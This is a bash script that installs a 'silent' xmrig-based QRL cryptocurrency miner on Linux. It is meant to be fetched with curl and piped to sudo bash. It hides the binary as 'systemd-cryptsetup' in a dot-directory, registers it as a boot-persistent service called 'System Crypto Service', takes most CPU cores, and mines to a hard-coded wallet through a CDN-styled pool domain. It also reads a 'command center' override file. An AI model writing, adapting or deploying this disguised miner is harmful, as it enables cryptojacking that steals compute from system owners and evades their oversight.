#!/usr/bin/env bash
# ============================================================
# mine_qrl_linux.sh — Silent QRL miner for Linux (x86_64 + ARM64)
# Supports: Ubuntu, Debian, Arch, CentOS, Fedora, Kali
# Features: huge pages, MSR tuning, systemd service, CDN proxy
# Process: disguised as system service
# Run: curl -fsSL https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine_qrl_linux.sh | sudo bash
# ============================================================

QRL_WALLET="Q01050018b4d2009efe67c3eb0b243f3b5e9c39ecdfd8cef470b508ae7be8901862ec26f817cc29"
POOL_HOST="cdn.snumcaj.com"
POOL_PORT="14006"
XMRIG_VERSION="6.26.0"

# ---- Auto worker name from IP ----
LOCAL_IP=$(hostname -I | awk '{print $1}' 2>/dev/null || ip route get 1 | awk '{print $7}' | head -1)
IP_LAST=$(echo "$LOCAL_IP" | awk -F. '{print $NF}')
WORKER="qrl-${IP_LAST:-$(hostname | cut -c1-6)}"

# ---- Detect architecture ----
ARCH=$(uname -m)
case "$ARCH" in
  x86_64)  XMRIG_ARCH="linux-x64" ;;
  aarch64) XMRIG_ARCH="linux-arm64" ;;
  armv7l)  XMRIG_ARCH="linux-armv7" ;;
  *)       echo "[!] Unsupported arch: $ARCH"; exit 1 ;;
esac

XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-${XMRIG_ARCH}.tar.gz"

# ---- Paths ----
DISGUISE_NAME="systemd-cryptsetup"
INSTALL_DIR="/var/lib/.sys-crypto"
BINARY_PATH="$INSTALL_DIR/$DISGUISE_NAME"
CONFIG_PATH="$INSTALL_DIR/config.json"
LOG_PATH="/var/log/${DISGUISE_NAME}.log"
SERVICE_PATH="/etc/systemd/system/${DISGUISE_NAME}.service"

# ---- Checks ----
if [[ $EUID -ne 0 ]]; then
  echo "[!] Run with sudo: curl -fsSL ... | sudo bash"
  exit 1
fi

MAX_THREADS=$(nproc)
THREADS=$(( MAX_THREADS * 80 / 100 ))
[[ $THREADS -lt 1 ]] && THREADS=1

# Check command center resource override
[[ -f /tmp/_miner_threads ]] && CC_THREADS=$(cat /tmp/_miner_threads 2>/dev/null | tr -d '[:space:]')
if [[ "$CC_THREADS" =~ ^[0-9]+$ ]] && [[ "$CC_THREADS" -ge 1 ]] && [[ "$CC_THREADS" -le "$MAX_THREADS" ]]; then
  THREADS=$CC_THREADS
fi

echo ""
echo "╔══════════════════════════════════════════╗"
echo "║     QRL MINER — Linux (root)             ║"
echo "╠══════════════════════════════════════════╣"
printf "║  Arch   : %-30s ║\n" "$ARCH"
printf "║  Cores  : %-30s ║\n" "$MAX_THREADS"
printf "║  Worker : %-30s ║\n" "$WORKER"
printf "║  Pool   : %-30s ║\n" "$POOL_HOST:$POOL_PORT"
echo "╚══════════════════════════════════════════╝"
echo ""

# ---- Thread prompt ----
if [[ -c /dev/tty ]]; then
  echo -n "  Cores to use [1-$MAX_THREADS, Enter=80%($THREADS)]: " > /dev/tty
  read -r USER_THREADS < /dev/tty || USER_THREADS=""
  if [[ "$USER_THREADS" =~ ^[0-9]+$ ]] && [[ "$USER_THREADS" -ge 1 ]] && [[ "$USER_THREADS" -le "$MAX_THREADS" ]]; then
    THREADS=$USER_THREADS
  fi
  echo "  → Mining with $THREADS / $MAX_THREADS cores"
  echo ""
fi

# ---- 1. Wipe old ----
echo "[1/7] Cleaning old install..."
systemctl stop "$DISGUISE_NAME" 2>/dev/null || true
systemctl disable "$DISGUISE_NAME" 2>/dev/null || true
pkill -9 -f "$DISGUISE_NAME" 2>/dev/null || true
pkill -9 -f "xmrig" 2>/dev/null || true
rm -rf "$INSTALL_DIR" "$SERVICE_PATH" "$LOG_PATH"
mkdir -p "$INSTALL_DIR"
echo "      ✓ Clean"

# ---- 2. Download xmrig ----
echo "[2/7] Downloading xmrig v${XMRIG_VERSION} (${ARCH})..."
curl -fsSL "$XMRIG_URL" -o /tmp/xmrig_linux.tar.gz
tar -xzf /tmp/xmrig_linux.tar.gz -C "$INSTALL_DIR" --strip-components=1
rm -f /tmp/xmrig_linux.tar.gz
mv "$INSTALL_DIR/xmrig" "$BINARY_PATH" 2>/dev/null || true
chmod +x "$BINARY_PATH"
echo "      ✓ Binary ready ($ARCH)"

# ---- 3. Enable huge pages (2× hashrate boost on Linux) ----
echo "[3/7] Enabling huge pages..."
HIT=0
# Transparent huge pages
echo always > /sys/kernel/mm/transparent_hugepage/enabled 2>/dev/null && HIT=1
# Static huge pages (2MB each, need 1168 for RandomX fast mode)
NR_HP=$(( THREADS * 147 ))  # ~147 huge pages per thread
echo "$NR_HP" > /proc/sys/vm/nr_hugepages 2>/dev/null
# Make persistent
if [[ -f /etc/sysctl.conf ]]; then
  sed -i '/vm.nr_hugepages/d' /etc/sysctl.conf
  echo "vm.nr_hugepages=$NR_HP" >> /etc/sysctl.conf
fi
ACTUAL_HP=$(cat /proc/sys/vm/nr_hugepages 2>/dev/null || echo 0)
echo "      ✓ Huge pages: $ACTUAL_HP allocated"

# ---- 4. MSR tuning (+15% hashrate) ----
echo "[4/7] Enabling MSR tuning..."
if modprobe msr 2>/dev/null; then
  echo "      ✓ MSR module loaded"
  MSR_ENABLED="true"
else
  echo "      — MSR not available (VM/container) — skipping"
  MSR_ENABLED="false"
fi

# ---- 5. Write config ----
echo "[5/7] Writing config..."
cat > "$CONFIG_PATH" << CONF
{
  "autosave": false,
  "background": false,
  "colors": false,
  "randomx": {
    "init": -1,
    "init-avx2": -1,
    "mode": "auto",
    "1gb-pages": false,
    "rdmsr": $MSR_ENABLED,
    "wrmsr": $MSR_ENABLED,
    "cache_qos": false,
    "numa": true,
    "scratchpad_prefetch_mode": 1
  },
  "cpu": {
    "enabled": true,
    "huge-pages": true,
    "huge-pages-jit": true,
    "hw-aes": true,
    "priority": 5,
    "yield": false,
    "asm": true,
    "argon2-impl": null,
    "max-threads-hint": 100,
    "memory-pool": true,
    "max-cpu-usage": 100,
    "rx": true
  },
  "pools": [
    {
      "url": "${POOL_HOST}:${POOL_PORT}",
      "user": "${QRL_WALLET}",
      "pass": "${WORKER}",
      "algo": "rx/0",
      "coin": "qrl",
      "tls": false,
      "keepalive": true,
      "nicehash": false,
      "enabled": true,
      "retry-pause": 5
    }
  ],
  "threads": $THREADS,
  "log-file": "${LOG_PATH}"
}
CONF
echo "      ✓ Config written (huge-pages: true, MSR: $MSR_ENABLED)"

# ---- 6. Install systemd service ----
echo "[6/7] Installing systemd service..."
cat > "$SERVICE_PATH" << SERVICE
[Unit]
Description=System Crypto Service
After=network.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=${BINARY_PATH} --config ${CONFIG_PATH}
Restart=always
RestartSec=5
Nice=-10
CPUSchedulingPolicy=rr
CPUSchedulingPriority=50
LimitNOFILE=65535
LimitMEMLOCK=infinity
StandardOutput=append:${LOG_PATH}
StandardError=append:${LOG_PATH}

[Install]
WantedBy=multi-user.target
SERVICE

systemctl daemon-reload
systemctl enable "$DISGUISE_NAME"
systemctl start "$DISGUISE_NAME"
echo "      ✓ Service installed and started (auto-starts on boot)"

# ---- 7. Launch ----
echo "[7/7] Starting..."
sleep 5

echo ""
echo "╔══════════════════════════════════════════╗"
echo "║         QRL MINER RUNNING — Linux        ║"
echo "╠══════════════════════════════════════════╣"
printf "║  Process : %-30s ║\n" "$DISGUISE_NAME"
printf "║  Wallet  : %-30s ║\n" "${QRL_WALLET:0:20}...${QRL_WALLET: -6}"
printf "║  Pool    : %-30s ║\n" "$POOL_HOST:$POOL_PORT"
printf "║  Worker  : %-30s ║\n" "$WORKER"
printf "║  Threads : %-30s ║\n" "$THREADS / $MAX_THREADS cores"
printf "║  HugePages: %-29s ║\n" "$ACTUAL_HP allocated"
printf "║  MSR     : %-30s ║\n" "$MSR_ENABLED"
printf "║  Log     : %-30s ║\n" "$LOG_PATH"
echo "╚══════════════════════════════════════════╝"
echo ""
echo "  Live logs : journalctl -u $DISGUISE_NAME -f"
echo "           OR: tail -f $LOG_PATH"
echo "  Status    : systemctl status $DISGUISE_NAME"
echo "  Stop      : systemctl stop $DISGUISE_NAME"
echo "  Balance   : https://qrl.herominers.com/#/dashboard?address=$QRL_WALLET"
echo ""
sleep 3
tail -20 "$LOG_PATH" 2>/dev/null || journalctl -u "$DISGUISE_NAME" -n 20 --no-pager 2>/dev/null || echo "[*] Starting up..."
